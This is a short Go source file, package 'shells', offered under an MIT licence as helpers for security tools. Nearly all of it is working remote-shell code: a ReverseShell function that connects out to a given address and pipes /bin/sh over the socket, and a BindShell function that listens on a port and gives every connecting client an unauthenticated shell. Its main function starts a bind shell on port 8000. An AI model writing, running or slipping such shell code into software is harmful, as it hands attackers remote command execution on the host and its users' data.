// The MIT License (MIT)
//
// Copyright © 2019 CYBINT
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// Package shells provides common functions used on cyber intelligence security
// related tools
package shells

import (
    "os/exec"
    "net"
)


func ReverseShell(network, address, shell string){
    c, _ := net.Dial(network, address)
    cmd := exec.Command(shell)
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}


func BindShell(network, address, shell string){
	l, _ := net.Listen(network, address)
	defer l.Close()
	for {
		// Wait for a connection.
		conn, _ := l.Accept()
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
		    cmd := exec.Command(shell)
		    cmd.Stdin = c
            cmd.Stdout = c
            cmd.Stderr = c
            cmd.Run()
            defer c.Close()
		}(conn)
	}
}


func main(){
    //ReverseShell("tcp", ":8000", "/bin/sh")
    BindShell("tcp", ":8000", "/bin/sh")
}